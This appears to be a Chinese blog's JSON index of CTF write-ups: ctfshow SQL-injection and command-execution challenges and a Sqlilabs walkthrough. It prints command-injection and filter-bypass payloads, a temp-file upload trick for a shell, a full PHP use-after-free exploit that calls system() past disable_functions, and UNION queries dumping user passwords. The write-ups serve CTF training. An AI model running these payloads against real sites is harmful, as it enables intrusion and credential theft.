chr(left)\tprint(result)\n\n\n\nweb215：加了单引号，修改脚本的payload至闭合查询语句即可。\nweb216：注意闭合查询语句，且前面的base64已经被闭合了，故不需要对我们的if语句进行处理，直接用上一题脚本微改即可。\nweb217：过滤了sleep函数，使用benchmark(5000000,sha(1))来代替sleep(3)，benchmark第一个参数表示计算重复的次数，第二个参数表示计算的式子，同样能起到延时的作用。\nweb218：过滤了sleep和benchmark，可以使用heavy query方法，heavy query顾名思义就是通过做大量的查询导致查询时间较长来达到延时的目的。\n","categories":["WriteUp"],"tags":["sql注入"]},{"title":"ctfshow-命令执行篇","url":"/2023/06/30/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87/","content":"web29：正常命令执行，过滤了flag，使用通配符*绕过\nweb30：多了system和php，用于替代system的函数：\nsystem()passthru()exec()shell_exec()popen()proc_open()pcntl_exec()反引号 同shell_exec() 注意除了system，其他都无回显，需要echo\n\npayload：c&#x3D;echo exec(‘nl fla?????’);\nweb31：多了cat \\  sort，空格也被过滤。\ncat被过滤，用于替代cat的函数：\nmore:下一页less:与 more 类似 head:查看头几行tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示tail:查看尾几行nl：显示的时候，顺便输出行号od:以二进制的方式读取档案内容vi:一种编辑器，这个也可以查看vim:一种编辑器，这个也可以查看sort:可以查看uniq:可以查看 file -f:报错出具体内容 grep1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings\n\npayload:c=eval($_GET[1]);&amp;1=system(&#x27;nl flag.php&#x27;);传马c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));c=show_source(next(array_reverse(scandir(pos(localeconv())))));函数嵌套c=echo(`nl%09fl[abc]*`);c=&quot;\\x73\\x79\\x73\\x74\\x65\\x6d&quot;(&quot;nl%09fl[a]*&quot;);十六进制等价于system()c=echo`strings%09f*`;反引号c=echo`strings\\$IFS\\$9f*`必须加转义字符\n\nweb32：过滤了括号，小知识：include不用括号，分号可以用?&gt;代替。\nc=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php\n\nweb33-36：全部用include+data即可\nweb37：文件包含过滤了flag，通配符f*绕过\nweb38：过滤了php，file等，使用data:&#x2F;&#x2F;text&#x2F;plain;base64,要执行命令的base64\nweb39：同上，相当于执行了php语句&lt;?php system(‘cat f*’)?&gt;.php\nweb40：无参rce，详见下面。\nweb41：无字母数字rce，详见下面，使用|,+,~来构造出需要的字符，有脚本可以直接用。\nweb42：&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1的意思就是不进行回显，将输出重定向至黑洞。\n那要让命令回显怎么办呢，进行命令分隔即可\n; &#x2F;&#x2F;分号 | &#x2F;&#x2F;只执行后面那条命令 || &#x2F;&#x2F;只执行前面那条命令 &amp; &#x2F;&#x2F;两条命令都会执行 &amp;&amp; &#x2F;&#x2F;两条命令都会执行\n也就是使用||就可以把后面的短路，只执行前面的命令，构造payload  cat flag.php||即可。web43：过滤了cat，换tac同上\nweb44：过滤了flag.，*或？通配符绕过\nweb45：过滤了空格，用$IFS$\nweb46：过滤了$,使用%09\nweb47：同上\nweb48：同上\nweb49：同上\nweb50：%09被过滤，使用&lt;&gt;代替空格，但需要注意&lt;&gt;和？同时使用不会回显，所以需要用\\来代替？。\nweb51：${IFS}代替空格\nweb52：同上\nweb53：同上\nweb54：把常用的查看文件的命令全部过滤了，而且使用*通配符来正则表达，使得无法使用\\绕过，这时候我们采用一个新的命令。\ngrep pattern file在文件file中搜索包含pattern的所有行，并将这些行打印出来payload： grep$&#123;IFS&#125;&#x27;&#123;&#x27;$&#123;IFS&#125;fl????hp\n\nweb55：只过滤了字母没有过滤数字，这里可以采用一种新的方式来查看flag.php\n可以使用？通配符来匹配到&#x2F;bin目录下的命令，&#x2F;bin目录下放着一些基本的命令，通过绝对路径来使用他们和直接用名字使用是完全一样的。\n&#x2F;bin&#x2F;base64 flag.php即可查看到flag，则使用&#x2F;???&#x2F;????64 ????.???查看flag\nweb56：无字母无数字无$getshell高级（临时文件利用）\nphp特性，上传文件后会放在&#x2F;tmp的临时目录，如果使用“.”来执行我们自己上传的脚本即可实现getshell。\n注意我们上传的文件会被重命名，默认的文件名是phpXXXXXX，后六位是随机的大小写字母，但是文件名中也有字母，无法直接输入文件名，只能使用通配符来执行文件，而通配符匹配出来的文件可能有多个，可以利用有可能有大写字母的特性来限定文件，????????[@-[]（由ascii值来将最后一位限定为大写，试几次就行）\n由于原来题目的页面并没有提供文件上传的功能，所以我们可以自己写一个html来进行文件上传。\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://77476791-58c4-46d2-99e0-5b89c8de5cab.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--链接是当前打开的题目链接--&gt;    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\n上传1.txt，点提交抓到提交的包，参数输入.%20&#x2F;???&#x2F;????????[@-[]来执行脚本，脚本内容里写上自己想要执行的linux命令即可。\n\nweb57：什么都没有只靠$和括号构造数字\n双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。 通俗地讲，就是将数学运算表达式放在((和))之间。 表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。 可以使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。 可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c&#x3D;$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。 注意，类似 c&#x3D;((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。\n$(( $((~$(()))) $((~$(()))) ))$((~$(())))==-1 中间有两个所以是-2 是相加的 那中间有36个就是-36，最后再统一取反可获得题目要求构造的36\n\nweb58-65：禁用函数代码突破，使用多种不同的方式扫描目录，读取文件\nshow_source();\nhighlight_file();\nfile_get_contents();\ninclude()  +    get_defined_vars();\ninclude();&#x2F;&#x2F;直接包含文件，或者利用php伪协议来读取文件\nweb66-70：\n多种输出函数：\necho\nprint_r()\nvar_dump()\nvar_export();\nweb71:\n将缓冲区预备输出的内容进行了替换输出，而将原来本要输出的内容清空\n为了避免这个替换操作，我们可以直接加多一行php代码，使得命令执行完直接结束php程序，加exit();或die();即可。\nweb72：尝试读取目录发现被open_basedir限制，使用glob伪协议来绕过\nc=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f.&quot;    &quot; ;&#125; exit(); 记得url编码再发送！！\n\n发现flag在flag0.txt中，尝试读取发现没有权限读取，此时使用一个开源脚本去读取\nc=?&gt;&lt;?phppwn(&quot;ls /;cat /flag0.txt&quot;); function pwn($cmd) &#123;    global $abc, $helper, $backtrace;    class Vuln &#123;        public $a;        public function __destruct() &#123;             global $backtrace;             unset($this-&gt;a);            $backtrace = (new Exception)-&gt;getTrace(); # ;)            if(!isset($backtrace[1][&#x27;args&#x27;])) &#123; # PHP &gt;= 7.4                $backtrace = debug_backtrace();            &#125;        &#125;    &#125;     class Helper &#123;        public $a, $b, $c, $d;    &#125;     function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;        $address = 0;        for($j = $s-1; $j &gt;= 0; $j--) &#123;            $address &lt;&lt;= 8;            $address |= ord($str[$p+$j]);        &#125;        return $address;    &#125;     function ptr2str($ptr, $m = 8) &#123;        $out = &quot;&quot;;        for ($i=0; $i &lt; $m; $i++) &#123;            $out .= sprintf(&#x27;%c&#x27;,$ptr &amp; 0xff);            $ptr &gt;&gt;= 8;        &#125;        return $out;    &#125;     function write(&amp;$str, $p, $v, $n = 8) &#123;        $i = 0;        for($i = 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] = sprintf(&#x27;%c&#x27;,$v &amp; 0xff);            $v &gt;&gt;= 8;        &#125;    &#125;     function leak($addr, $p = 0, $s = 8) &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak = strlen($helper-&gt;a);        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;     function parse_elf($base) &#123;        $e_type = leak($base, 0x10, 2);         $e_phoff = leak($base, 0x20);        $e_phentsize = leak($base, 0x36, 2);        $e_phnum = leak($base, 0x38, 2);         for($i = 0; $i &lt; $e_phnum; $i++) &#123;            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = leak($header, 0, 4);            $p_flags = leak($header, 4, 4);            $p_vaddr = leak($header, 0x10);            $p_memsz = leak($header, 0x28);             if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write                # handle pie                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec                $text_size = $p_memsz;            &#125;        &#125;         if(!$data_addr || !$text_size || !$data_size)            return false;         return [$data_addr, $text_size, $data_size];    &#125;     function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) = $elf;        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;            $leak = leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                # &#x27;constant&#x27; constant check                if($deref != 0x746e6174736e6f63)                    continue;            &#125; else continue;             $leak = leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                # &#x27;bin2hex&#x27; constant check                if($deref != 0x786568326e6962)                    continue;            &#125; else continue;             return $data_addr + $i * 8;        &#125;    &#125;     function get_binary_base($binary_leak) &#123;        $base = 0;        $start = $binary_leak &amp; 0xfffffffffffff000;        for($i = 0; $i &lt; 0x1000; $i++) &#123;            $addr = $start - 0x1000 * $i;            $leak = leak($addr, 0, 7);            if($leak == 0x10102464c457f) &#123; # ELF header                return $addr;            &#125;        &#125;    &#125;     function get_system($basic_funcs) &#123;        $addr = $basic_funcs;        do &#123;            $f_entry = leak($addr);            $f_name = leak($f_entry, 0, 6);             if($f_name == 0x6d6574737973) &#123; # system                return leak($addr + 8);            &#125;            $addr += 0x20;        &#125; while($f_entry != 0);        return false;    &#125;     function trigger_uaf($arg) &#123;        # str_shuffle prevents opcache string interning        $arg = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);        $vuln = new Vuln();        $vuln-&gt;a = $arg;    &#125;     if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123;        die(&#x27;This PoC is for *nix systems only.&#x27;);    &#125;     $n_alloc = 10; # increase this value if UAF fails    $contiguous = [];    for($i = 0; $i &lt; $n_alloc; $i++)        $contiguous[] = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);     trigger_uaf(&#x27;x&#x27;);    $abc = $backtrace[1][&#x27;args&#x27;][0];     $helper = new Helper;    $helper-&gt;b = function ($x) &#123; &#125;;     if(strlen($abc) == 79 || strlen($abc) == 0) &#123;        die(&quot;UAF failed&quot;);    &#125;     # leaks    $closure_handlers = str2ptr($abc, 0);    $php_heap = str2ptr($abc, 0x58);    $abc_addr = $php_heap - 0xc8;     # fake value    write($abc, 0x60, 2);    write($abc, 0x70, 6);     # fake reference    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);     $closure_obj = str2ptr($abc, 0x20);     $binary_leak = leak($closure_handlers, 8);    if(!($base = get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#x27;t determine binary base address&quot;);    &#125;     if(!($elf = parse_elf($base))) &#123;        die(&quot;Couldn&#x27;t parse ELF header&quot;);    &#125;     if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#x27;t get basic_functions address&quot;);    &#125;     if(!($zif_system = get_system($basic_funcs))) &#123;        die(&quot;Couldn&#x27;t get zif_system address&quot;);    &#125;     # fake closure object    $fake_obj_offset = 0xd0;    for($i = 0; $i &lt; 0x110; $i += 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;     # pwn    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4); # internal func type    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler     ($helper-&gt;b)($cmd);    exit();&#125;\n\n在pwn函数里面写自己要执行的php代码即可。记得url编码后再发送。\nweb73-74：同样使用伪协议glob来扫描文件目录\nweb75-76：先glob扫目录，再通过连接数据库来获得flag，详见题解脚本\nc= try &#123;    $dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,        &#x27;root&#x27;);     foreach ($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row) &#123;        echo ($row[0]) . &quot;|&quot;;    &#125;    $dbh = null;&#125; catch (PDOException $e) &#123;    echo $e-&gt;getMessage();    exit(0);&#125;exit(0);\n\n\n\nweb77：题在题干中说到php7.4，可以想到FFI\n\nFFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。\n\n通过FFI，可以实现调用system函数，从而将flag直接写入一个新建的文本文件中，然后访问这个文本文件，获得flag，详见题解脚本\n//首先是熟悉的确定flag位置和名称c=?&gt;&lt;?php \t$a=new DirectoryIterator(&quot;glob:///*&quot;); \tforeach($a as $f) \t&#123; \t\techo($f-&gt;__toString().&#x27;  &#x27;);\t&#125; \texit();?&gt;//FFI调用system函数c=$ffi=FFI :: cdef(&quot;int system(const char *command);&quot;);$a=&#x27;/readflag &gt; 1.txt&#x27;;$ffi-&gt;system($a);exit();\n\nweb118：以下几题使用了一个很冷门的方式来绕过，通过linux，bash的内置变量截取字符来rce。前提：没有过滤大写字母\n~A获得最后一个字符\n所以可以利用各个环境变量的最后一位来构造命令。${PWD}在这题肯定是&#x2F;var&#x2F;www&#x2F;html，而${PATH}通常是bin,那么${PWD:A}的结果就应该是’ l ‘，因为${PATH:A}的结果是’ n ‘，那么他们拼接在一起正好是nl，能够读取flag，因为通配符没有被过滤，所以可以用通配符代替flag.php\nweb119-120:\n可以构造出/bin/base64 flag.php，只需要/和4两个字符就行，其他的可以用通配符代替。/很简单，pwd的第一位就是，因为这题ban了数字，所以可以用该题值必是1的$&#123;#SHLVL&#125;绕过SHLVL是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时$&#123;SHLVL&#125;=1，然后在此shell中再打开一个shell时$SHLVL=2。只需要$&#123;PWD::$&#123;SHLVL&#125;&#125;，结果就是/RANDOM此变量值，随机出现整数，范围为0-32767。不过，虽然说是随机，但并不是真正的随机，因为每次得到的随机数都一样。为此，在使用RANDOM变量前，请随意设定一个数字给RANDOM，当做随机数种子，这样才不会每次产生的随机数其顺序都一样。4的问题，可以用$&#123;#RANDOM&#125;，在Linux中，$&#123;#xxx&#125;显示的是这个值的位数不加#是变量的值，加了#是变量的值的长度，例如12345的值是5，而random函数绝大部分产生的数字都是4位或者5位的，因此可以代替4.payload：code=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???\n\nweb121:SHLVL被过滤，可以用&#96;$或$\n","categories":["WriteUp"],"tags":["命令执行"]},{"title":"Sqlilabs通关","url":"/2023/06/30/Sqlilabs%E9%80%9A%E5%85%B3/","content":"Sqlilabs通关ingPage1lesson1提交数据为字符串，加单引号闭合。通用步骤：检测是否存在sql注入漏洞，判断注入点，判断数据提交方式构造闭合，order by查显示字段，database等查信息，查表名，查列名，查敏感信息。                                \npayload：1‘ union select 1,group_concat(username),group_concat(password) from users#\nlesson2提交数据为数字，不用闭合\npayload：1 and 1&#x3D;2 union select 1,group_concat(username),group_concat(password) from users#（正常查询后面加个and 1&#x3D;2 可以防止输出正常查询的内容）\nlesson3通过报错信息看出闭合方式 ‘)\npayload：1’ and 1&#x3D;2) union select 1,group_concat(username),group_concat(password) from users–+\nlesson4通过报错信息看出闭合方式“)\npayload：1” and 1 &#x3D; 2) union select 1,group_concat(username),group_concat(password) from users–+\nlesson5无回显，盲注，有报错，尝试布尔盲注    and 错误条件  来尝试暴力破解，详见bindsql_bool.py脚本\n","categories":["WriteUp"],"tags":["Sql注入"]}]